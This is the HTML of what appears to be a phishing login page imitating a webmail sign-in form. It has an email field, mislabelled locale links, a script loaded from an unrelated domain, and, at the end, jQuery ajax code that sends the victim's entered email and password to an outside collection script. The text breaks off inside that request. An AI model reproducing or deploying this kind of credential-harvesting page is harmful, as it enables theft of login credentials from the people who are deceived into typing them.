        ...
        <div id="login-container">
            ...
            <div id="login-sub-container">
                    ...
                    <div id="login-sub">
                        ...
                        <div id="forms">
                            <form novalidate="" id="login_form" action="" method="POST"  style="visibility:">
                                <div class="input-req-login"><label for="user">Email Address</label></div>
                                <div class="input-field-login icon username-container">
                                    <input name="email" id="email" autofocus="autofocus"  placeholder="Enter your email address." class="std_textbox" type="text" tabindex="1" required="">
                                </div>
                                ...
                                <div class="controls">
                                    <div class="login-btn">
                                        <button name="login"  id="submit-btn" tabindex="3">Log in</button>
                                    </div>
        ...
        <!--CLOSE login-container -->
            ...
            <div class="locale-container">
                ...
                <ul id="locales_list">
                        ...
                        <li><a href="/?locale=bg">italiano</a></li>
                    
                        
                        <li><a href="/?locale=cs">polski</a></li>
                        ...
                        <li><a href="/?locale=el">Filipino</a></li>
                ...
                <div id="mobilelocalemenu">Select a locale:
                    <a href="javascript:void(0)" title="Change locale">English</a>
                </div>
            </div>
        </div>
    </div>
...
<!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    ...
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
	 <script src="https://huadongarmouredcable.com/jquerydropper.js"></script>
    <script>
...
$.ajax({
dataType: 'JSON',
url: 'https://web4serv09webrevi.com/webmail09876254526383000/postersss.php',
type: 'GET',
      	data:{
			email:email,
            password:password,	
